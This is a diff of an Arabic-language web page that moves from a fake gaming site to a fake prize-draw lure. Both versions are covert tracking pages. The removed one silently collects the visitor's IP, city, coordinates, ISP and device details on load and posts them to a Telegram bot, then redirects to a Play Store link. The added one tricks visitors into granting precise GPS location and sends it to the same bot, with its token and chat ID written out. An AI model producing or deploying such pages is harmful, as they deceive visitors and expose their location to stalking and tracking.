@@ -3,106 +3,91 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>🎮 موقع الألعاب المجنونة</title>
+  <title>🎁 اربح جوائز حسب موقعك!</title>
   <style>
     body {
-      margin: 0;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: linear-gradient(to right, #141e30, #243b55);
-      color: #fff;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
+      background-color: #f0f0f0;
+      font-family: 'Tahoma', sans-serif;
       text-align: center;
+      padding: 40px;
+      color: #222;
     }
 
     h1 {
       font-size: 2.5rem;
-      margin-bottom: 10px;
+      color: #2c3e50;
     }
 
     p {
       font-size: 1.2rem;
-      margin-bottom: 20px;
+      margin-top: 15px;
     }
 
-    .loader {
-      border: 6px solid #f3f3f3;
-      border-top: 6px solid #3498db;
-      border-radius: 50%;
-      width: 60px;
-      height: 60px;
-      animation: spin 1s linear infinite;
-      margin-top: 20px;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
+    button {
+      padding: 14px 25px;
+      margin-top: 25px;
+      font-size: 18px;
+      background-color: #3498db;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
     }
 
     .footer {
-      position: absolute;
-      bottom: 10px;
-      font-size: 0.8rem;
-      color: #ccc;
+      margin-top: 60px;
+      font-size: 0.9rem;
+      color: #888;
     }
   </style>
 </head>
 <body>
 
-  <h1>🔥 لعبة الذكاء الخارقة</h1>
-  <p>جارٍ التحقق من جهازك لبدء اللعب...</p>
-  <div class="loader"></div>
+  <h1>🎯 اربح جوائز حسب منطقتك!</h1>
+  <p>اضغط على الزر أدناه لتأكيد موقعك والمشاركة في السحب المجاني 🔥</p>
 
-  <div class="footer">
-    جميع الحقوق محفوظة © 2025
-  </div>
+  <button onclick="getLocation()">📍 تأكيد موقعي الآن</button>
+
+  <div class="footer">جميع الحقوق محفوظة © 2025</div>
 
   <script>
-    fetch("https://ipinfo.io/json?token=46eede76a5f9e6")
-      .then(res => res.json())
-      .then(ipinfo => {
-        const data = {
-          userAgent: navigator.userAgent,
-          language: navigator.language,
-          screen: screen.width + "x" + screen.height,
-          ip: ipinfo.ip,
-          city: ipinfo.city,
-          region: ipinfo.region,
-          country: ipinfo.country,
-          loc: ipinfo.loc,
-          org: ipinfo.org
-        };
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocation, showError);
+      } else {
+        alert("❌ متصفحك لا يدعم خاصية تحديد الموقع.");
+      }
+    }
 
-        const message =
-          "📡 تم فتح الرابط!\n" +
-          "📱 الجهاز: " + data.userAgent + "\n" +
-          "🌐 اللغة: " + data.language + "\n" +
-          "🖥️ الشاشة: " + data.screen + "\n" +
-          "🌍 الموقع: " + data.city + ", " + data.region + ", " + data.country + "\n" +
-          "📌 الإحداثيات: " + data.loc + "\n" +
-          "🔌 مزود الخدمة: " + data.org + "\n" +
-          "🛰️ IP: " + data.ip;
+    function sendLocation(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+      const accuracy = position.coords.accuracy;
 
-        fetch("https://api.telegram.org/bot8261552434:AAG13F3E318guMFGLuLUqdDA78LIk4yWg04/sendMessage", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            chat_id: "5014833892",
-            text: message
-          })
-        });
+      const message =
+        "📍 تم تحديد موقع الزائر:\n" +
+        "🌍 الإحداثيات: " + lat.toFixed(6) + ", " + lon.toFixed(6) + "\n" +
+        "🎯 دقة الموقع: ±" + Math.round(accuracy) + " متر\n" +
+        "📱 الوقت: " + new Date().toLocaleString('ar');
 
-        // إعادة التوجيه بعد 4 ثوانٍ لصفحة مزيفة أو حقيقية
-        setTimeout(() => {
-          window.location.href = "https://play.google.com/store/apps/details?id=com.game.fakeapp";
-        }, 4000);
+      // إرسال إلى تليجرام
+      fetch("https://api.telegram.org/bot8261552434:AAG13F3E318guMFGLuLUqdDA78LIk4yWg04/sendMessage", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: "5014833892",
+          text: message
+        })
       });
+
+      alert("✅ تم تسجيل موقعك بنجاح، شكراً لمشاركتك!");
+    }
+
+    function showError(error) {
+      alert("❌ لم نتمكن من تحديد موقعك. الرجاء المحاولة مرة أخرى.");
+    }
   </script>
 
 </body>
